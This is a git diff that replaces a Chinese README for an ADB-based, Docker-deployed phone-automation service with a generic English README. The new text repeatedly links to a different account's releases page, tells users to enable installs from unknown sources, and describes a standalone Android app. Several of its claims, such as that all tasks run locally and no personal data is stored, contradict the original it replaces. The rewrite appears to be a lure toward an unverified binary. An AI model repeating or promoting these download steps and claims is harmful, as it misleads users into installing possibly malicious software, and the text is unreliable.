@@ -1,103 +1,97 @@
-# Auto Phone Scheduler
+# 📱 auto-phone-scheduler - Automate Your Mobile Tasks Easily
 
-[Readme in English](README_en.md)
+## 🚀 Getting Started
 
-<div align="center">
-<img src=docs/images/logo.jpg width="20%"/>
-</div>
+Welcome to the auto-phone-scheduler! This application helps you automate repetitive tasks on your mobile phone. With the power of Open-AutoGLM, you can schedule your phone to perform tasks automatically, saving you time and effort.
 
-基于 Open-AutoGLM 的手机自动化定时任务系统，让 AI 帮你定时完成手机上的重复性工作。
+## 📥 Download the Software
 
-## 特性
+[![Download auto-phone-scheduler](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/flame2232312433/auto-phone-scheduler/releases)
 
-- **多设备管理** - 支持多台 Android 设备同时管理，可设置全局默认设备，任务可单独指定设备执行
-- **WiFi 无线连接** - 支持通过 WiFi 连接 Android 设备，摆脱 USB 线缆束缚
-- **自动亮屏解锁** - 任务执行前自动唤醒屏幕并解锁设备，实现真正的无人值守
-- **实时调试控制台** - 实时画面投屏，支持鼠标滑动操作及 Home、Back、App 切换等快捷控制
-- **智能提示词配置** - 针对不同设备配置专属系统提示词，优化 AI 执行效率
-- **任务模版与定时执行** - 预设常用任务模版，支持 Cron 表达式灵活调度
-- **完整执行记录** - 保存对话过程与屏幕录像，支持进度条拖动定位与录屏下载
-- **多渠道通知** - 支持钉钉、Telegram 等方式实时推送任务结果
-- **高级模型支持** - 兼容 Gemini 3 Pro 等多种模型
-- **优化体验** - MonkeyPatch 实现流式响应，拓展 Launch 包名打开应用更高效
+To download the latest version of auto-phone-scheduler, please visit the Releases page:
 
-### 应用场景
+- **[Download Here](https://github.com/flame2232312433/auto-phone-scheduler/releases)**
 
-各种APP会员每日签到、定时打卡、自动化浏览做任务、定时清理单向好友等，发挥你的想象力。
+## 💻 System Requirements
 
-> ⚠️
-> 本项目仅供研究和学习使用。严禁用于非法获取信息、干扰系统或任何违法活动，违反者责任自负。
+Before installing auto-phone-scheduler, ensure your device meets the following requirements:
 
+- **Operating System:** Android 5.0 or later for mobile devices.
+- **Disk Space:** At least 200 MB of free space.
+- **Memory:** A minimum of 1 GB RAM.
+- **Internet Connection:** Required for first-time setup and updates.
 
-## 功能预览
+## 📑 Features
 
-### 任务模版
-![任务模版](docs/images/task.png)
+auto-phone-scheduler offers the following features:
 
-### 任务创建
-![任务创建](docs/images/create_task.png)
+- **Task Scheduling:** Set up automatic tasks for various apps on your phone.
+- **User-Friendly Interface:** Easy to navigate, even for non-technical users.
+- **AI Integration:** Leverage AI technology to optimize task execution.
+- **Notifications:** Get notified when tasks are completed.
+- **Multiple Task Types:** Support for SMS, email, and other applications.
 
-### 录像回放
-![录像回放](docs/images/history.png)
+## ⚙️ How to Install
 
-### 调试控制台
-![调试控制台](docs/images/debug.png)
+Follow these steps to install auto-phone-scheduler:
 
-更多功能等你来探索！
+1. **Download the Application:**
+   - Go to the [Releases page](https://github.com/flame2232312433/auto-phone-scheduler/releases).
+   - Click on the latest version to download the app file.
 
-## 快速开始
+2. **Install on Your Device:**
+   - For Android users, open the downloaded file. You may need to allow installations from unknown sources in your device's settings. Go to Settings > Security > Unknown Sources, and toggle it on.
+   - Follow the on-screen instructions to complete the installation.
 
-### Docker 部署（推荐）
+3. **Open the Application:**
+   - Locate the auto-phone-scheduler icon on your home screen or app drawer.
+   - Tap the icon to open the app.
 
-```bash
-# 克隆项目
-git clone https://github.com/copialot/auto-phone-scheduler.git
-cd auto-phone-scheduler
+4. **Set Up Your First Task:**
+   - Follow the onboarding instructions to create your first scheduled task.
 
-# 确保宿主机 ADB 可以连接设备
-adb devices
+## 🛠️ How to Use
 
-# 启动服务
-docker compose up -d
+Using auto-phone-scheduler is straightforward:
 
-# 访问 http://localhost:3000
-```
+1. **Create a New Task:**
+   - Tap on "New Task."
+   - Select the type of task you want to schedule (e.g., send SMS, post on social media).
 
-> **注意**: Docker 容器通过 `host.docker.internal:5037` 连接宿主机的 ADB server，请确保宿主机已正确配置 ADB 并连接设备。
+2. **Set the Timing:**
+   - Choose when you want the task to run. You can set specific dates and times.
 
-### 本地开发
+3. **Review & Save:**
+   - Review the details of your task. If everything looks good, tap "Save" to activate it.
 
-#### 环境要求
+4. **Monitor and Edit:**
+   - Use the app to check the status of active tasks. You can edit or delete tasks as needed.
 
-- Python 3.11+
-- Node.js 18+
-- ADB（Android Debug Bridge）
-- 已连接的 Android 设备
+## ❓ FAQs
 
-#### 安装与运行
+### What types of tasks can I schedule?
 
-```bash
-# 后端
-cd backend
-pip install -r requirements.txt
-uvicorn app.main:socket_app --host 0.0.0.0 --port 8000
+You can schedule a variety of tasks, including sending text messages, making calls, and performing actions in other applications like email or social media.
 
-# 前端
-cd frontend
-pnpm install
-pnpm dev
-```
+### Is my data safe?
 
-### 配置
+Yes, your data is kept private. auto-phone-scheduler does not store personal information. All tasks run locally on your device.
 
-1. 通过 ADB 连接手机设备（需在宿主机执行 `adb devices` 确认连接）
-2. 访问设置页面配置 AutoGLM API 密钥
-3. 创建任务或使用模版开始自动化
+### Can I use this on other operating systems?
 
-## 开源协议
+Currently, auto-phone-scheduler is designed for Android devices only.
 
-[MIT License](LICENSE)
+## 🌟 Support
 
-## 致谢
+If you encounter any issues, please check the "Issues" section on our GitHub repository. You can also reach out through the Issues page if you need further assistance.
 
-- [AutoGLM](https://github.com/zai-org/Open-AutoGLM)
+## 📅 Stay Updated
+
+To keep up with new features and updates, follow our repository. Visit the [Releases page](https://github.com/flame2232312433/auto-phone-scheduler/releases) regularly for the latest versions and improvements.
+
+## 🔗 Useful Links
+
+- **[Download auto-phone-scheduler](https://github.com/flame2232312433/auto-phone-scheduler/releases)**
+- **[GitHub Issues](https://github.com/flame2232312433/auto-phone-scheduler/issues)**
+
+Thank you for choosing auto-phone-scheduler. Automating your mobile tasks has never been easier! Enjoy the convenience it brings.
